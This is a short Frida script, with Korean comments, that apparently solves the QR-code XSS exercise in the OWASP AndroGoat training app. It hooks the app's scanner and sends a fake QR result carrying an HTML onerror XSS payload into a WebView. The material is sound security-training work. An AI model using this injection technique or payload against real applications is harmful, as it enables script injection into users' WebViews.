// QR 스캐너가 읽었다고 가정한 문자열을 앱의 DecodeCallback 에 직접 전달 (에뮬레이터 카메라 대체)
// 앱 코드: codeScanner.decodeCallback = DecodeCallback { ... "<b>$scannedText</b>" ... webView.loadData(...) }
var PAYLOAD = "<img src=x onerror=\"alert('QR XSS: ' + document.body.innerText.substring(0,40))\">";

Java.perform(function () {
    var Result = Java.use("com.google.zxing.Result");
    var Format = Java.use("com.google.zxing.BarcodeFormat");
    Java.choose("owasp.sat.agoat.QRCodeXSSActivity", {
        onMatch: function (act) {
            var scanner = act.codeScanner.value;
            var cb = scanner.getDecodeCallback();
            var res = Result.$new(PAYLOAD, null, null, Format.QR_CODE.value);
            console.log("[*] QR 스캔 결과 주입: " + PAYLOAD);
            cb.onDecoded(res);
        },
        onComplete: function () { console.log("[*] done"); }
    });
});
